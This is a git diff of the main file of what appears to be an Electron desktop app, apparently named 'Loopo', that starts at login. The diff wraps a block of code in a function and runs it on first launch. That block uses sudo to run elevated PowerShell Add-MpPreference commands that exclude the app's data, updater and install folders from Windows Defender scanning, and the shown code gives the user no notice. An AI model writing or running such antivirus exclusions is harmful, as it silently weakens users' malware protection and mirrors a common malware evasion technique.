@@ -11,25 +11,28 @@ app.setLoginItemSettings({
   path: app.getPath('exe')
 });
 
+var cmdChecker;
 
+function powershellCall(){
 
-//powershell
-let apploc = app.getPath("userData");
-let  appInstallDir= app.getAppPath();
-let appUpdateLoc = apploc.replace("Roaming", "Local");
-let appInstallDirReg = appInstallDir.replace(/\\resources\\app/g, "");
-appUpdateLoc = appUpdateLoc+'-updater';
+      //powershell
+      let apploc = app.getPath("userData");
+      let  appInstallDir= app.getAppPath();
+      let appUpdateLoc = apploc.replace("Roaming", "Local");
+      let appInstallDirReg = appInstallDir.replace(/\\resources\\app/g, "");
+      appUpdateLoc = appUpdateLoc+'-updater';
 
-var options = {
-  name : 'Loopo'
-};
+      var options = {
+        name : 'Loopo'
+      };
 
-sudo.exec('powershell.exe Add-MpPreference -ExclusionPath "'+apploc+'";powershell.exe Add-MpPreference -ExclusionPath "'+appUpdateLoc+'";powershell.exe Add-MpPreference -ExclusionPath "'+appInstallDirReg+'"', options, 
-function(error,stdout,stderr){
-  if(error)throw error;
-    console.log('stdout : ' + stdout);
-})
-// end powershell
+      sudo.exec('powershell.exe Add-MpPreference -ExclusionPath "'+apploc+'";powershell.exe Add-MpPreference -ExclusionPath "'+appUpdateLoc+'";powershell.exe Add-MpPreference -ExclusionPath "'+appInstallDirReg+'"', options, 
+      function(error,stdout,stderr){
+        if(error)throw error;
+          console.log('stdout : ' + stdout);
+      })
+      // end powershell
+      }
 var statusPulse;
 var updateCheck = true;
 
@@ -413,6 +416,17 @@ function createDefaultWindow() {
 }
  
 app.whenReady().then(() => {
+
+  fs.readFile(app.getPath('userData') + '/cmdChecker.conf','utf-8', (error, data) =>{
+    if(error || data == '' || !data){
+      fs.writeFileSync(app.getPath('userData')+'/cmdChecker.conf', 'config_data_launch_first:true');
+      powershellCall();
+    }else{
+      //
+    }
+  });
+  
+
 
   fs.readFile(app.getPath('userData') + '/firstLaunch.conf','utf-8', (error, data) =>{
     if(error || data == '' || !data){
